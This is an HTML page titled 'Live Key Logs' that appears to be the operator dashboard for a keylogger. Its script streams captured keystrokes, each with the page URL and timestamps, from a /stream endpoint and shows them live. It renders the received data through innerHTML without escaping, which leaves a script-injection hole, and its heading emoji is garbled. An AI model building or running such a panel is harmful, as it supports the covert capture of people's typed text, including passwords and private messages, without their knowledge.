<!DOCTYPE html>
<html>
<head>
    <title>Live Logs</title>
    <style>
        body { background:#111; color:#0f0; font-family: monospace; padding:20px; }
        .log { padding:10px; border-bottom:1px solid #333; margin-bottom:10px; }
        .key { color:#0ff; }
        .url { color:#ff0; }
        .time { color:#f90; }
    </style>
</head>
<body>
    <h1>ðŸ”´ Live Key Logs</h1>
    <div id="logs"></div>

    <script>
        const logsDiv = document.getElementById("logs");
        const evtSource = new EventSource("/stream");

        evtSource.onmessage = function(event) {
            const data = JSON.parse(event.data);

            const div = document.createElement("div");
            div.className = "log";
            div.innerHTML = `
                <div><span class="url">${data.url}</span></div>
                <div>Keys: <span class="key">${data.keys.join(' ')}</span></div>
                <div><span class="time">${data.timestamps.join(', ')}</span></div>
            `;

            logsDiv.prepend(div);
        };
    </script>
</body>
</html>
